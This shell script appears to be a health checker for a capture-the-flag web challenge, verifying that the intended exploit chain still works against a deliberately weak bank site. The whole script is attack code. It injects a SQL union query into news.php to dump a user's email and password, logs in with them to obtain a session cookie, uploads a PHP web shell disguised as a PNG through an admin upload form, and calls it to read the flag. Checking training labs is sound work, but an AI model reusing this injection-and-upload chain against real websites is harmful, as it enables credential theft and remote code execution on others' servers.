#!/bin/sh

# Exit on first error
set -e

# Correct values
MAIL="adm1n@weakbank.it"
PASSWORD="weak_password"

# Domain and resolve
DOMAIN="weakbank2.webctf.it"
RESOLVE="--resolve $DOMAIN:80:172.17.0.1 --resolve $DOMAIN:443:172.17.0.1"

# Extract credentials
CREDENTIALS="$(curl $RESOLVE -s --fail https://$DOMAIN/main/news.php?news=0%20union%20select%20email,2,password,4%20from%20users%20limit%201,2\;--+)"

# Check credentials
echo "$CREDENTIALS" | grep -q "$MAIL" && echo "$CREDENTIALS" | grep -q "$PASSWORD"

# Connect and get a PHPSESSID
PHPSESSID="$(curl $RESOLVE -s --fail -i --data 'email='$MAIL'&pass='$PASSWORD 'https://'$DOMAIN'/funcs/login.php' | sed -n 's/.*PHPSESSID=\([^;]*\).*/\1/p')"

# Upload the shell
SHELL_PATH="$(curl $RESOLVE -s --fail -X POST https://$DOMAIN/admin/upload.php --cookie 'PHPSESSID='$PHPSESSID -H 'Content-Type: multipart/form-data' -F 'cover[]=@/health_checker/shell.png; filename=img.png.php; Content-Type: image/png' | sed -n 's/.*upload\\\/\([^"]*\).*/\1/p')"

# Check if the shell prints the correct flag
curl $RESOLVE -s --fail https://"$DOMAIN"/upload/"$SHELL_PATH" | grep -q "$FLAG"
